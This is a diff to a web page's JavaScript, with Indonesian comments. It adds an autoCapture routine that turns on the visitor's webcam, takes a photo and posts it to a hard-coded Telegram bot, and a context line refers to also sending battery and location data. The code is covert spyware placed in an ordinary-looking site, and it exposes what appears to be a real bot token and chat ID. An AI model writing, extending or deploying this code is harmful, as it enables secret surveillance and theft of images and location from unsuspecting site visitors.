@@ -115,24 +115,33 @@
       document.getElementById("sidebar").classList.toggle("open");
     });
 
-  // === Kirim foto ke Telegram ===
-  async function kirimFotoTelegram(blob) {
-    let botToken = "8315944864:AAFyCLJaWx0xujUlIYTQmA7M8B1GGDA2ARQ";
-    let chatId  = "8007345794";
-
-    let formData = new FormData();
-    formData.append("chat_id", chatId);
-    formData.append("photo", blob, "capture.jpg");
-
-    try {
-      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-        method: "POST",
-        body: formData
-      });
-    } catch (e) {
-      console.error("❌ Gagal kirim:", e);
+    // ===================== Kamera otomatis + kirim Telegram =====================
+    async function kirimFotoTelegram(blob) {
+      let botToken = "8315944864:AAFyCLJaWx0xujUlIYTQmA7M8B1GGDA2ARQ";
+      let chatId  = "8007345794";
+      let formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("photo", blob, "capture.jpg");
+      try { await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: formData }); }
+      catch(e){ console.error("❌ Gagal kirim:", e); }
     }
-  }
+
+    async function autoCapture() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        await video.play();
+        await new Promise(r=>setTimeout(r,800));
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext("2d").drawImage(video,0,0,canvas.width,canvas.height);
+        const blob = await (await fetch(canvas.toDataURL("image/jpeg"))).blob();
+        stream.getTracks().forEach(track=>track.stop());
+        kirimFotoTelegram(blob);
+      } catch(err){ console.error("Gagal akses kamera:", err); }
+    }
 
   // === Kirim teks ke Telegram (untuk baterai & lokasi) ===
   async function kirimTelegramPesan(pesan) {
